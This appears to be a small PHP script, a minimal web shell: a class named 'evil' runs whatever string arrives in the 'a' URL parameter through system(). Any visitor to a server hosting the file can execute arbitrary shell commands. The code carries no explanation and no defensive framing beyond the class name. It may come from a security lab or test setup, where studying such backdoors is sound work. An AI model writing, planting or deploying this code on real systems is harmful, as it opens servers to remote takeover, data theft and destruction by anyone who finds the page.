<?php
/**
 * Created by PhpStorm.
 * User: meizj
 * Date: 2020/2/17
 * Time: 10:36 AM
 */

Class evil{
    public function rce($command){
        system($command);
    }
}
$a = $_GET['a'];
$b = new evil();
$b->rce($a);